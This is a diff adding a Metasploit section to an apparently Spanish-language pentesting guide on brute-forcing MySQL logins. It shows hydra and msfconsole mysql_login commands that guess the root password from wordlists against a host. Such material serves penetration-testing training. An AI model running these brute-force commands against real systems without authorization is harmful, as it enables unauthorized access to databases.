@@ -61,3 +61,27 @@ hydra -L users.txt -P passwords.txt mysql://127.0.0.1 -t 15
 {% hint style="info" %}
 El con el parámetro`-t` le indicamos el número de hilos que queremos emplear
 {% endhint %}
+
+### Metasploit
+
+Para hacer fuerza bruta con metasploit, usaremos el modulo "`auxiliary/scanner/mysql/mysql_login`", que configuraremos adaptandolo a nuestras necesidades, por ejemplo, en este caso, sabemos el usuario pero la contraseña:
+
+```perl
+msfconsole
+
+use auxiliary/scanner/mysql/mysql_login
+
+set RHOSTS 192.168.1.1
+
+set USERNAME root
+
+set PASS_FILE /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt
+
+set VERBOSE false
+
+set STOP_ON_SUCCESS true
+
+exploit
+```
+
+<figure><img src="../../.gitbook/assets/image (95).png" alt=""><figcaption></figcaption></figure>
